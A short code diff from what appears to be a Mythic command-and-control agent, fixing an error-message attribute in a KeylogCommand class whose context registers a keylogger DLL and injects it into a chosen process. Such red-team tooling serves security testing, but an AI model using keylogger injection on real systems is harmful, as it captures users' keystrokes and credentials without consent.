@@ -64,7 +64,7 @@ class KeylogCommand(CommandBase):
         if file_resp.status == MythicStatus.Success:
             task.args.add_arg("file_id", file_resp.response['agent_file_id'])
         else:
-            raise Exception("Failed to register keylogger DLL: " + file_resp.error_message)
+            raise Exception("Failed to register keylogger DLL: " + file_resp.error)
         task.display_params = "Injecting keylogger into PID: {} ({})".format(task.args.get_arg("pid"), task.args.get_arg("arch"))
         task.args.remove_arg("arch")
         return task
